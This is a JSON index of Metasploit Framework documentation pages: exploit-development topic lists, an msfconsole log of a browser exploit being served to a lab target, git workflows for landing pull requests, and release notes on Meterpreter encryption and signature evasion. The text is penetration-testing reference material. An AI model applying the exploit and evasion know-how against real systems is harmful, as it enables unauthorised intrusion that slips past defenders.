    "content": ". | Style Tips | Get Started Writing an Exploit | How to get started with writing an auxiliary module | How to get started with writing a post module | How to get started with writing a Meterpreter script | Running Private Modules | Exploit Ranking | Module Reference Identifiers | How to check Microsoft patch levels for your exploit | How to clean up files using FileDropper | How to deprecate a Metasploit module | How to do reporting or store data in module development | How to log in Metasploit | How to obfuscate JavaScript in Metasploit | How to parse an HTTP response | How to Send an HTTP Request Using HTTPClient | How to send an HTTP request using Rex Proto Http Client | How to use command stagers | How to use datastore options | How to use Msf Auxiliary AuthBrute to write a bruteforcer | How to use PhpEXE to exploit an arbitrary file upload bug | How to use Powershell in an exploit | How to use Railgun for Windows post exploitation | How to Use the FILEFORMAT mixin to create a file format exploit | How to use the Msf Exploit Remote Tcp mixin | How to use the Seh mixin to exploit an exception handler | How to use WbemExec for a write privilege attack on Windows | How to write a browser exploit using BrowserExploitServer | How to write a browser exploit using HttpServer | How to write a check() method | How to write a HTTP LoginScanner Module | How to write a module using HttpServer and HttpClient | How to zip files with Msf::Util::EXE.to_zip | How to use Metasploit Framework Compiler Windows to compile C code | How to use Metasploit Framework Obfuscation CRandomizer | How to decrypt RC4 with Metasploit Framework Compiler | How to decode Base64 with Metasploit Framework Compiler | How to XOR with Metasploit Framework Compiler | Using ReflectiveDll Injection | Oracle Usage | Definition of Module Reliability, Side Effects, and Stability | . ",
    "url": "/#metasploit-development",
    "relUrl": "/#metasploit-development"
  },"376": {
    "doc": "Home",
    "title": "Metasploit Payloads",
    "content": ". | How Payloads Work | Merging Metasploit Payload Gem Updates | Meterpreter Configuration | Meterpreter HTTP Communication | Meterpreter Paranoid Mode | Meterpreter Reliable Network Communication | Meterpreter Sleep Control | Meterpreter Stageless Mode | Meterpreter Timeout Control | Meterpreter Transport Control | Meterpreter Unicode Support | Payload UUID | Python Extension | The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers | . ",
    "url": "/#metasploit-payloads",
    "relUrl": "/#metasploit-payloads"
  },"377": {
    "doc": "Home",
    "title": "Other Metasploit Resources",
    "content": ". | Metasploit 5.0 Release Notes | Downloads by Version | Evading Anti Virus | How to use a Metasploit module appropriately | How to use a reverse shell in Metasploit | Information About Unmet Browser Exploit Requirements | How to use msfvenom | What my Rex Proto SMB Error means | Why CVE Is Not Available | . ",
    "url": "/#other-metasploit-resources",
    "relUrl": "/#other-metasploit-resources"
  },"378": {
    "doc": "Home",
    "title": "GitHub Resources",
    "content": ". | Git Cheatsheet | Git Reference Sites | Remote Branch Pruning | . ",
    "url": "/#github-resources",
    "relUrl": "/#github-resources"
  },"379": {
    "doc": "Home",
    "title": "Home",
    "content": "Welcome to Metasploit-land. Are you a Metasploit user who wants to get started or get better at hacking stuff (that you have permission to hack)? The quickest way to get started is to download the Metasploit nightly installers. This will give you access to both the free, open-source Metasploit Framework and a free trial of Metasploit Pro. If you’re using Kali Linux, Metasploit is already pre-installed. See the Kali documentation for how to get started using Metasploit in Kali Linux. Are you anxious to get your Metasploit Development Environment set up so you can start Landing Pull Requests and contributing excellent exploit code? If so, you’re in the right place. If you’re an exploit developer, you will want to review our Guidelines for Accepting Modules and Enhancements to find out what we expect when we see pull requests for new Metasploit modules. No idea what you should start working on? Check out the guidelines for contributing to Metasploit, and dive into Setting Up a Metasploit Development Environment. ",
    "url": "/",
    "relUrl": "/"
  },"380": {
    "doc": "Information About Unmet Browser Exploit Requirements",
    "title": "Information About Unmet Browser Exploit Requirements",
    "content": "So I see your browser exploit has refused to attack due to some kind of unmet requirements. Typically this means one of the following: . | Your target doesn’t have the right conditions to be exploited. | Your target isn’t vulnerable at all. | . The exploit should say what requirements are not met. The requirements are explained here: . | Key | Description | . | :source | Target has JavaScript disabled. | . | :ua_name | Target isn’t using the preferred browser. For example: Firefox, IE. | . | :ua_ver | Target isn’t using the preferred browser version. | . | :os_name | Target isn’t using the preferred operating system. | . | :os_flavor | This has been deprecated. If you see this, your Metasploit is most likely out of date. | . | :language | Target isn’t using the preferred OS language. | . | :arch | Target isn’t on the preferred architecture. For example: x86/x64 | . | :proxy | Target has a proxy. | . | :silverlight | Target doesn’t have Silverlight installed. | . | :office | Target doesn’t have the preferred version of Microsoft Office installed, so the exploit cannot bypass DEP. | . | :java | Target doesn’t have the preferred version of Java. Often this is used by exploits to bypass DEP. | . | :clsid | Target doesn’t have the preferred ActiveX control. If this is the problem, you will only see a mismatch with :activex instead of :clsid. | . | :method | Target doesn’t have the preferred ActiveX control. If this is the problem, you will only see a mismatch with :activex instead of :method. | . | :mshtml_build | Target isn’t on the preferred build of Internet Explorer. Usually means only specific builds of IE are vulnerable. | . | :flash | Target isn’t using the preferred version of Adobe Flash. Often this is used by exploits to leverage code execution. | . | :vuln_test | A custom JavaScript-based check. There should be a custom vuln_test_error message explaining why on msfconsole. | . How to manually check requirement comparisons: . If you’d like to check the comparisons, simply set VERBOSE to true. The following is an example: . msf exploit(ms13_022_silverlight_script_object) &gt; set VERBOSE true VERBOSE =&gt; true msf exploit(ms13_022_silverlight_script_object) &gt; run [*] Exploit running as background job. [*] Started reverse handler on 192.168.1.64:4444 [*] Using URL: http://0.0.0.0:8080/SHIzaS2aZxIA6 msf exploit(ms13_022_silverlight_script_object) &gt; [*] Local IP: http://192.168.1.64:8080/SHIzaS2aZxIA6 [*] Server started. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'sVfdquJGHzpHyLItxoTgeJI'. [*] 192.168.1.80 ms13_022_silverlight_script_object - Gathering target information. [*] 192.168.1.80 ms13_022_silverlight_script_object - Sending response HTML. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Info receiver page called. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'ZnKtXOQIvxAclSrEOxJ'. [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received sniffed browser data over POST: {\"os_name\"=&gt;[\"Microsoft Windows\"], \"os_flavor\"=&gt;[\"XP\"], \"ua_name\"=&gt;[\"MSIE\"], \"ua_ver\"=&gt;[\"8.0\"], \"arch\"=&gt;[\"x86\"], \"java\"=&gt;[\"null\"], \"silverlight\"=&gt;[\"false\"], \"flash\"=&gt;[\"null\"], \"office\"=&gt;[\"null\"], \"mshtml_build\"=&gt;[\"18702\"]}. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'ZnKtXOQIvxAclSrEOxJ'. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Serving exploit to user with tag ZnKtXOQIvxAclSrEOxJ [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Setting target \"ZnKtXOQIvxAclSrEOxJ\" to :tried. [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: source=(?i-mx:script|headers) vs k=script [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: os_name=Microsoft Windows vs k=Microsoft Windows [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: ua_name=MSIE vs k=MSIE [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: silverlight=true vs k=false [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: arch=x86 vs k=x86 [!] 192.168.1.80 ms13_022_silverlight_script_object - Exploit requirement(s) not met: silverlight . Related Reading: . | How to write a browser exploit using BrowserExploitServer | . ",
    "url": "/docs/using-metasploit/other/information-about-unmet-browser-exploit-requirements.html",
    "relUrl": "/docs/using-metasploit/other/information-about-unmet-browser-exploit-requirements.html"
  },"381": {
    "doc": "Keeping in sync with rapid7 master",
    "title": "Some Terminology",
    "content": "In this quick HOWTO, we’ll be referring to the rapid7 fork of metasploit-framework as upstream. It’s a pretty common local configuration, advocated by the development environment setup. Your fork of metasploit-framework will be referred to as origin. The term ‘repo’ is short for ‘Repository.’ Also known as ‘fork’ (as a noun). ",
    "url": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html#some-terminology",
    "relUrl": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html#some-terminology"
  },"382": {
    "doc": "Keeping in sync with rapid7 master",
    "title": "The Easy Way",
    "content": "The easiest way to keep in sync with master is to trash your fork of metasploit-framework, and re-fork. This is a surprisingly common practice, since most people in the world don’t work with Metasploit every day. If you’re the sort to be struck by hackerish inspiration every few months, and couldn’t give a whit about preserving branches, history, or pull requests, simply nuke your local fork. On your fork, in the GitHub UI, go to Settings, scroll down to the Danger Zone, and hit Delete this repository. Once you’ve re-authenticated, re-fork the metasploit-framework repository by going to the Rapid7 repo and hit Fork as hard as you possibly can. ",
    "url": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html#the-easy-way",
    "relUrl": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html#the-easy-way"
  },"383": {
    "doc": "Keeping in sync with rapid7 master",
    "title": "The Hard Way",
    "content": "If you’re contributing to the Metasploit Framework a lot, first off, THANK YOU. Metasploit is more than a framework, it’s a collective and a community of people around the world who are driven to make the Internet – and therefore, human civilization – a better place. Gushing aside, if you want to keep in sync with upstream, the hard way (and therefore, best way), is to have a local clone of origin/mestasploit-framework on your local workstation. (Linux is preferred, but there are servicable solutions for OSX and Windows). And, with that said, the GitHub documentation is pretty excellent in explaining how to do this – it’s really not all that hard. Take a look at their Fork A Repo docs, and do what it says. One thing I like to do is to keep separate branches for master (which tracks origin/master), and upstream-master (which tracks, unsurprisingly, upstream/master). If you just want to know how to add an upstream remote, check it out. Once you’ve done that, all you need to do is to pull one of these: . git checkout -b upstream-master --track upstream/master git checkout master git merge --ff-only upstream-master git commit git push origin . Now, this only works well if you never commit to master. If you do, you’re going to have a bad time, as you’ll eventually hit a dreaded merge conflict. Any change you make, be it for local experimentation or public proposal, should be done in a branch from the master branch (or, if you’re a habitual committer, a branch off the upstream-master branch). Ignore this advice at your own peril. ",
    "url": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html#the-hard-way",
    "relUrl": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html#the-hard-way"
  },"384": {
    "doc": "Keeping in sync with rapid7 master",
    "title": "The Max Powers Way",
    "content": "It’s like the wrong way, but faster. - Max Powers . If you are allergic to the command line, it is possible to sync with upstream/master via the GitHub web UI. This is a little messy, but it’s handy if you have small changes that you don’t care to sign (by the way, you should sign your commits). First, go to the Rapid7 branch, and click the green, somewhat subtle mini-PR button. Then, click Compare across forks, and set base fork to your fork, while leaving the head fork pointing to Rapid7’s fork. That’ll take you to a URL like this: https://github.com/rapid7/metasploit-framework/compare/YOURGITHUBNAME:master...master . Next, you’ll hit the big green Create a Pull Request button, which will drop you to a new PR page, against your own fork. Fill it in, then immediately click the PRs icon on the left side, find your new PR, and merge it. This will keep your GitHub-hosted fork up-to-date, and if you prefer using the GitHub UI over a real development environment, you can jump in and start making changes there. This method is especially handy for light changes, like documentation or cosmetic changes to modules. However, using the GitHub UI means that you are necessarily not testing new modules or libraries, and you of course cannot sign your commits, which is horrifying. It’s also nice for people very new to GitHub as a collaborative platform. ",
    "url": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html#the-max-powers-way",
    "relUrl": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html#the-max-powers-way"
  },"385": {
    "doc": "Keeping in sync with rapid7 master",
    "title": "Keeping in sync with rapid7 master",
    "content": " ",
    "url": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html",
    "relUrl": "/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html"
  },"386": {
    "doc": "Landing Pull Requests",
    "title": "The short story",
    "content": ". | Configure your git environment as described here. | Add the fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* line to your .git/config. | Add your signing key git config --global user.signingkey . | Use gpg --list-keys to view your available keys. Note that on certain systems you may need to replace gpg with gpg2. Sample output can be seen below: . pub rsa4096 2020-04-07 [SC] 3198961E148FF5E527E31A5FD35E05C0F2B81E83 uid [ultimate] Grant Willcox &lt;gwillcox@rapid7.com&gt; sub rsa4096 2020-04-07 [E] . | Set the GPG key as your signing key. To set the key shown above as the signing key for all repositories, one would execute: . git config --global user.signingkey 3198961E148FF5E527E31A5FD35E05C0F2B81E83 . | . | When merging code from a pull request, always, always merge -S --no-ff --edit, and write a meaningful 50/72 commit message that references the original PR as #1234 (not PR1234, not PR#1234, not 1234). For example, your message should look like this: . Land #1234, a whizbang bug fix Adds a whiz to the existing bang. It appears that without this, bad things can occasionally happen. Thanks [@mcfakepants](https://www.github.com/mcfakepants)! Fixes #1024, also see #999. | The -S flag indicates that you’re going to sign the merge with your PGP/GPG key, which is a nice assurance that you’re really you. | The --no-ff flag indicates that you want to create a merge commit no matter what, even if the merge would normally be resolved as a fast forwards. This ensure that all changes have a commit associated with them. | The --edit flag will drop you into your default editor (normally vim), and will allow you to edit the commit message so that it conforms to Metasploit standards, rather than sticking with git’s pre-generated commit message which does not. | . | Note that the --no-ff flag should be used both for PRs that go back to a contributor’s branch as well as PRs that land in Metasploit’s master branch. | If you’re making changes (often the case), merge to a landing branch, then merge that branch to upstream/master with the -S --no-ff --edit options. | . ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#the-short-story",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#the-short-story"
  },"387": {
    "doc": "Landing Pull Requests",
    "title": "Handy Git aliases",
    "content": "Check out this gist that automates (mostly) landing pull requests, signing the merge commit, all while rarely losing a race with other committers. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#handy-git-aliases",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#handy-git-aliases"
  },"388": {
    "doc": "Landing Pull Requests",
    "title": "Fork and clone",
    "content": "First, fork and clone the rapid7/metasploit-framework repo, following these instructions. I like using ssh with ~/.ssh/config aliases as described here, but the https method will work, too. Once this is done, you will have a remote repository called “origin,” which points to your forked repository on GitHub. You will be doing most of your work in your own fork of Metasploit, even if you have commit rights to Rapid7’s fork. Now, we’re going to add an “upstream” repository to talk to the Rapid7 repository. In addition, we’re going to add a magical line to the config file that will let us see all pull requests against the Rapid7 repo (both open and closed). Note that this will take a minute since you’re adding some hundreds of megs to your clone’s refs. So, open up metasploit-framework/.git/config with your favorite editor, add an upstream remote, and add the pull request refs for both your and Rapid7’s forks. In the end, you should have a section that started off like this: . [remote \"upstream\"] fetch = +refs/heads/*:refs/remotes/upstream/* fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* url = https://github.com/rapid7/metasploit-framework . And now it looks like this: . [remote \"upstream\"] fetch = +refs/heads/*:refs/remotes/upstream/* fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* url = git@github.com:rapid7/metasploit-framework.git [remote \"origin\"] fetch = +refs/heads/*:refs/remotes/origin/* fetch = +refs/pull/*/head:refs/remotes/origin/pr/* url = https://github.com/YOURNAME/metasploit-framework . Some people like to copy these over into remotes named “rapid7” and “yourusername” just so they don’t have to remember about “origin” and “upstream,” but for this doc, we’ll just assume you have “origin” and “upstream” defined like this. Now, you can git fetch the remote PRs. This will take a little bit, since we have a couple dozen MBs of pull request data. Storage is cheap, though, right? . $ git fetch --all Fetching todb-r7 remote: Counting objects: 13, done. remote: Compressing objects: 100% (1/1), done. remote: Total 7 (delta 6), reused 7 (delta 6) Unpacking objects: 100% (7/7), done. From https://github.com/todb-r7/metasploit-framework * [new ref] refs/pull/1/head -&gt; origin/pr/1 * [new ref] refs/pull/2/head -&gt; origin/pr/2 Fetching upstream remote: Counting objects: 91, done. remote: Compressing objects: 100% (29/29), done. remote: Total 59 (delta 47), reused 42 (delta 30) Unpacking objects: 100% (59/59), done. From https://github.com/rapid7/metasploit-framework [... bunches of tags and PRs ...] * [new ref] refs/pull/1701/head -&gt; upstream/pr/1701 * [new ref] refs/pull/1702/head -&gt; upstream/pr/1702 . You can git fetch a remote any time, and you’ll get access to the latest changes to all branches and pull requests. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#fork-and-clone",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#fork-and-clone"
  },"389": {
    "doc": "Landing Pull Requests",
    "title": "Branching from PRs",
    "content": "A manageable strategy for dealing with outstanding PRs is to start pre-merge testing on the pull request in isolation. For example, to work on PR #1217, we would: . $ git checkout upstream/pr/1217 Note: checking out 'upstream/pr/1217'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b new_branch_name HEAD is now at 9e499e5... Make BindTCP test more robust ((no branch)) todb@mazikeen:~/git/rapid7/metasploit-framework ``` ``` $ git checkout -b landing-1217 . Now, we’re on a local branch identical to the original pull request, and can move on from there. We can make our changes, isolated from master, and then either send them back to the contributor (this requires looking up the original contributor’s GitHub username and branch name on GitHub), or if there aren’t any changes or the changes are trivial, we can land them (if you have committer rights to Rapid7’s repo, this is where you land them to the upstream repo). In this particular case with PR #1217, I did want to send some changes back to the contributor. Important: If the codebase the contributor’s PR is based on is severely outdated (e.g., they branched off an outdated master), you should not test their PR in isolation as described above. Instead, you should create a test branch that is identical to the latest codebase, merge the contributor’s PR into the test branch, and then start your testing. You may need to bundle install to ensure you’re using the right gems. Here’s an example with #6954 (your workflow may vary): . $ git checkout upstream/master Note: checking out 'upstream/master'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b &lt;new-branch-name&gt; HEAD is now at afbeb2b... Land #7023, fixes for swagger exploit $ git merge --no-ff --no-edit upstream/pr/6954 Merge made by the 'recursive' strategy. modules/exploits/windows/local/payload_inject.rb | 5 +++++ 1 file changed, 5 insertions(+) [*] Running msftidy.rb in .git/hooks/post-merge mode --- Checking new and changed module syntax with tools/dev/msftidy.rb --- modules/exploits/windows/local/payload_inject.rb - msftidy check passed ------------------------------------------------------------------------ . This ensures that the contributor’s PR is being tested against the latest codebase and not an outdated one. If you do not do this, when you land the PR, you may end up breaking Metasploit. Note that the example above will leave you in a detached HEAD state. This is fine if you just want to test the module in question, however if you want to make any changes, don’t forget to make a new branch. For the example above this could be done by running the following command: . git checkout -b land-6594 . ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#branching-from-prs",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#branching-from-prs"
  },"390": {
    "doc": "Landing Pull Requests",
    "title": "Checking out branches from a remote forked repo in your forked repo",
    "content": "After your .git/config is set up per the above, and you successfully run git fetch --all, you are two steps away from being able to check out a branch from a contributor’s forked repo. You need to add their fork once as a remote: git remote add OTHER_USER git://github.com/OTHER_USER/metasploit-framework.git. Now pull down the latest from them: git fetch OTHER_USER. Now you can check out branches from OTHER_USER per usual, e.g. git checkout bug/foo. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#checking-out-branches-from-a-remote-forked-repo-in-your-forked-repo",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#checking-out-branches-from-a-remote-forked-repo-in-your-forked-repo"
  },"391": {
    "doc": "Landing Pull Requests",
    "title": "Making changes",
    "content": "$ gvim .gitignore [... make some changes and some commits ...] (landing-1217) todb@mazikeen:~/git/rapid7/metasploit-framework $ git checkout -b pr1217-fix-gitignore-conflict Switched to a new branch 'pr1217-fix-gitignore-conflict' (pr1217-fix-gitignore-conflict) todb@mazikeen:~/git/rapid7/metasploit-framework $ git push origin pr1271-fix-gitignore-conflict (pr1217-fix-gitignore-conflict) todb@mazikeen:~/git/rapid7/metasploit-framework $ git pr-url schierlm javapayload-maven Created new window in existing browser session. This sequence does a few things after editing .gitconfig. It creates another copy of landing-1217 (which is itself a copy of upstream/pr/1217)). Next, I push those changes to my branch (todb-r7, aka “origin”). Finally, I have a mighty .gitconfig alias here to open a browser window to send a pull request to the original contributor’s branch (you will want to edit yours to reflect your real GitHub username, of course). pr-url = !\"echo https://github.com/YOURNAME/metasploit-framework/pull/new/HISNAME:HISBRANCH...YOURBRANCH\" . Filling in the blanks (provided by the original PR’s information from GitHub) gets me: . https://github.com/todb-r7/metasploit-framework/pull/new/schierlm:javapayload-maven...pr1217-fix-gitignore-conflict . I opened that in a browser, and ended up with https://github.com/schierlm/metasploit-framework/pull/1 . Once @schierlm landed it on his branch (again, using git merge --no-ff and a short, informational merge commit message), all I (or anyone) had to do was git fetch to get the change reflected in upstream/pr/1217, and then the integration of the PR could continue. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#making-changes",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#making-changes"
  },"392": {
    "doc": "Landing Pull Requests",
    "title": "Collaboration between contributors",
    "content": "Note the important bit here: you do not need commit rights to Rapid7 to branch pull requests. If Alice knows a solution to Bob’s pull request that Juan pointed out, it is easy for Alice to provide that solution by following the procedure above. git blame will still work correctly, commit histories will all be accurate, everyone on the pull request will be notified of Alice’s changes, and Juan doesn’t have to wait around for Bob to figure out how to use send_request_cgi() or whatever the problem was. The hardest part is remembering how to construct the pull request to Bob – lucky for you, this .git/config alias makes that part pretty push-button. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#collaboration-between-contributors",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#collaboration-between-contributors"
  },"393": {
    "doc": "Landing Pull Requests",
    "title": "Landing to upstream",
    "content": "Back to PR #1217. Turns out, my change was enough to land the original chunk of work. So, someone else (@jlee-r7) was able to to do something like this: . $ git fetch upstream remote: Counting objects: 12, done. remote: Compressing objects: 100% (2/2), done. remote: Total 7 (delta 5), reused 7 (delta 5) Unpacking objects: 100% (7/7), done. From https://github.com/rapid7/metasploit-framework 9e499e5..263e967 refs/pull/1651/head -&gt; upstream/pr/1651 . This all looked good, so he could land this to Rapid7’s repo with: . $ git checkout -b upstream-master --track upstream/master $ git merge -S --no-ff --edit landing-1217 $ git push upstream upstream-master:master . Or, if he already have upstream-master checked out: . $ git checkout upstream-master $ git rebase upstream/master $ git merge -S --no-ff --edit landing-1217 $ git push upstream upstream-master:master . The --edit is optional if we have our editor configured correctly in $HOME/.gitconfig. The point here is that we always want a merge commit, and we never want to use the (often useless) default merge commit message. For #1217, this was changed to: . Land #1217, java payload build system refactor . Note that you should rebase before landing – otherwise, your merge commit will be lost in the rebase. Finally, the -S indicates we are going to sign the merge, using our GPG key. This is a nice way to prove in a secure way that this merge is, in fact, coming from you, and not someone impersonating you. For more on signing merges, see A Git Horror Story: Repository Integrity With Signed Commits. To set yourself up for signing, your .gitconfig (or metasploit-framework/git/.config) file should have these entries: . [user] name = Your Name email = your@email.xxx signingkey = DEADBEEF # Must match exactly with your key for \"Your Name &lt;your@email.xxx&gt;\" [alias] c = commit -S --edit m = merge -S --no-ff --edit . People with commit rights to rapid7/metasploit-framework will have their keys listed here. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#landing-to-upstream",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#landing-to-upstream"
  },"394": {
    "doc": "Landing Pull Requests",
    "title": "Post-Merge",
    "content": "After a pull request has been merged, release notes should be added to the pull request in the form of a comment. These release notes will automatically be extracted and used as documentation when creating the metasploit release notes. Release note examples: . | 12873 Release notes | 12831 Release notes | . The rn-no-release-notes label must be added if there are no release notes for the merged pull request. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#post-merge",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#post-merge"
  },"395": {
    "doc": "Landing Pull Requests",
    "title": "Cross-linking PRs, Bugs, and Commits",
    "content": "TODO: Update in this new post-Redmine, GitHub issues world . ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#cross-linking-prs-bugs-and-commits",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#cross-linking-prs-bugs-and-commits"
  },"396": {
    "doc": "Landing Pull Requests",
    "title": "Merge conflicts",
    "content": "The nice thing about this strategy is that you can test for merge conflicts straight away. You’d use a sequence like: . git checkout upstream/pr/1234 git checkout -b landing-1234 git checkout master git checkout -b master-temp git merge landing-1234 master-temp . If that works, great, you know you don’t have any merge conflicts right now. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#merge-conflicts",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#merge-conflicts"
  },"397": {
    "doc": "Landing Pull Requests",
    "title": "Questions and Corrections",
    "content": "Reach out in #contributors on Metasploit Slack, or by e-mailing msfdev at metasploit dot com. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html#questions-and-corrections",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html#questions-and-corrections"
  },"398": {
    "doc": "Landing Pull Requests",
    "title": "Landing Pull Requests",
    "content": "This page is meant for Committers. If you are unsure whether you are a committer, you are not. Metasploit is built incrementally by the community through GitHub’s Pull Request mechanism. Submitting pull requests (or PRs) is already discussed in the Dev environment setup documentation. It’s important to realize that PRs are a feature of GitHub, not git, so this document will take a look at how to get your git environment to deal with them sensibly. ",
    "url": "/docs/development/maintainers/process/landing-pull-requests.html",
    "relUrl": "/docs/development/maintainers/process/landing-pull-requests.html"
  },"399": {
    "doc": "Merging Metasploit Payload Gem Updates",
    "title": "Merging Metasploit Payload Gem Updates",
    "content": "When the Metasploit Payloads has a new merge appear in master, a new Ruby gem is built and automatically pushed up to RubyGems. This new version needs to be merged into the Metasploit Framework repository for those changes to be included. To do this, committers must: . | Create a new branch in the Metasploit Framework repository. | Name it something useful like metasploit-payloads-&lt;version&gt;. | Modify metasploit-framework.gemspec, so that the new version number is specified for the metasploit-payloads gem. | Run bundle install. | Remove any test/development binaries from data/meterpreter. | Run tools/modules/update_payload_cached_sizes.rb. | Make sure that Gemfile.lock only contains changes that are related to Metasploit Payloads. | Stage the following for commit in git: . | Gemfile.lock | metasploit-framework.gemspec | Any payload modules that have had an updated payload size (usually this includes stageless payloads only) | . | Commit the staged files. | Push the branch to github. | Create the Pull Request. | . Done! . A sample update PR/commit can be found here: https://github.com/rapid7/metasploit-framework/pull/7666/files . ",
    "url": "/docs/development/maintainers/ruby-gems/merging-metasploit-payload-gem-updates.html",
    "relUrl": "/docs/development/maintainers/ruby-gems/merging-metasploit-payload-gem-updates.html"
  },"400": {
    "doc": "Metasploit Framework 5.0 Release Notes",
    "title": "Get Metasploit 5.0",
    "content": "You can get Metasploit 5.0 by checking out the 5.0.0 tag in the Metasploit GitHub project. Need a primer on Framework architecture and usage? Take a look at our wiki here, and feel free to reach out to the broader community on Slack. There are also myriad public and user-generated resources on Metasploit tips, tricks, and content, so if you can’t find something you want in our wiki, ask Google or the community what they recommend. See all the ways to stay informed and get involved at https://metasploit.com. ",
    "url": "/docs/development/roadmap/metasploit-5-release-notes.html#get-metasploit-50",
    "relUrl": "/docs/development/roadmap/metasploit-5-release-notes.html#get-metasploit-50"
  },"401": {
    "doc": "Metasploit Framework 5.0 Release Notes",
    "title": "Metasploit Framework 5.0 Release Notes",
    "content": "Metasploit Framework 5.0 has released! . Metasploit 5.0 brings many new features, including new database and automation APIs, evasion modules and libraries, language support, improved performance, and ease-of-use. See the release announcement here. The following is a high-level overview of Metasploit 5.0’s features and capabilities. | Metasploit users can now run the PostgreSQL database by itself as a RESTful service, which allows for multiple Metasploit consoles and external tools to interact with it. | Parallel processing of the database and regular msfconsole operations improves performance by offloading some bulk operations to the database service. | A JSON-RPC API enables users to integrate Metasploit with additional tools and languages. | This release adds a common web service framework to expose both the database and the automation APIs; this framework supports advanced authentication and concurrent operations. Read more about how to set up and run these new services here. | Adds evasion module type and libraries to let users generate evasive payloads without having to install external tools. Read the research underpinning evasion modules here. Rapid7’s first evasion modules are here. | The metashell feature allows users to run background sessions and interact with shell sessions without needing to upgrade to a Meterpreter session. | External modules add Metasploit support for Python and Go in addition to Ruby. | Any module can target multiple hosts by setting RHOSTS to a range of IPs, or by referencing a hosts file with the file:// option. Metasploit now treats RHOST and RHOSTS as identical options. | An updated search mechanism improves Framework start time and removes database dependency. | . ",
    "url": "/docs/development/roadmap/metasploit-5-release-notes.html",
    "relUrl": "/docs/development/roadmap/metasploit-5-release-notes.html"
  },"402": {
    "doc": "Metasploit Framework 6.0 Release Notes",
    "title": "Payload Improvements",
    "content": "Quite a few payload improvements have been made, most but not all have been for the Meterpreter payload and it’s various implementations. Among other things, it was updated to support AES encryption in CBC mode in all implementations on all transports. This helps to secure framework users data in transit. Now any files transferred, commands issued, etc. are encrypted on the network using a AES and a key negotiated via RSA. This helps remove static strings from network traffic, but it’s not the only change targeting obfuscation. Each of the Meterpreter commands were replaced with an integer equivalent, thus removing conspicuous values such as stdapi_fs_file_copy, core_migrate and mimikatz_custom_command. Additionally, the payload binaries were updated to utilize functions by ordinal value rather than by name. This allows them to be called without disclosing their own conspicuous values such as RefletiveLoader, ext_server_, etc. Lastly, the static “Block API” used by almost all x86 and x64 Windows shellcode payloads was updated to be polymorphic, causing it to be randomized on each invocation. In some payloads, the Block API accounts for as much as half of the shellcode and was an easy target for signature-based detection. All of these changes mark strides towards complicating the identification of key artifacts generated by Metasploit via static analysis, ie. signatures. Compatibility Changes . Metasploit 6 drops Meterpreter support for Windows versions older than XP SP2. This service pack adds a number of API methods that are required by Meterpreter and backporting compatibility is not a priority at this time. The Meterpreter stage will fail to load on these older, 